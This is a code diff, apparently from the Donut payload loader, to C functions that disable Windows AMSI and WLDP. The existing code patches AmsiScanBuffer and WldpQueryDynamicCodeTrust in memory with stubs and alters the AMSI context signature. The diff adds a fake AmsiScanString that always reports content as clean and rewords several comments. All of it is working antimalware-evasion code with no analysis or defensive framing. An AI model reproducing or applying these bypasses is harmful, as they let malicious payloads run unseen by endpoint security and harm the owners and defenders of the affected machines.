@@ -51,6 +51,19 @@ static HRESULT WINAPI AmsiScanBufferStub(
 
 static VOID AmsiScanBufferStubEnd(VOID) {}
 
+// fake function that always returns S_OK and AMSI_RESULT_CLEAN
+HRESULT AmsiScanString(
+  HAMSICONTEXT amsiContext,
+  LPCWSTR      string,
+  LPCWSTR      contentName,
+  HAMSISESSION amsiSession,
+  AMSI_RESULT  *result)
+{
+    *result = AMSI_RESULT_CLEAN;
+    return S_OK;
+}
+static VOID AmsiScanStringStubEnd(VOID) {}
+
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
     HMODULE amsi;
@@ -73,12 +86,12 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
         if(inst->api.VirtualProtect(
           cs, len, PAGE_EXECUTE_READWRITE, &op))
         {
-          // over write with stub
+          // over write with virtual address of stub
           Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);
           
           disabled = TRUE;
             
-          // set back to original protection
+          // set memory back to original protection
           inst->api.VirtualProtect(cs, len, op, &t);
         }
       }
@@ -112,14 +125,14 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
       ctx = (_PHAMSICONTEXT)&cs[i];
       // is it "AMSI"?
       if(ctx->Signature == inst->amsi.w[0]) {
-        // set page protection for write access
+        // set memory protection for write access
         inst->api.VirtualProtect(cs, sizeof(DWORD), 
           PAGE_EXECUTE_READWRITE, &op);
           
         // change signature
         ctx->Signature++;
         
-        // set page back to original protection
+        // set memory back to original protection
         inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
         disabled = TRUE;
         break;
@@ -241,7 +254,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
         if(inst->api.VirtualProtect(
           cs, len, PAGE_EXECUTE_READWRITE, &op))
         {
-          // over write with stub
+          // overwrite with virtual address of stub
           Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
         
           disabled = TRUE;
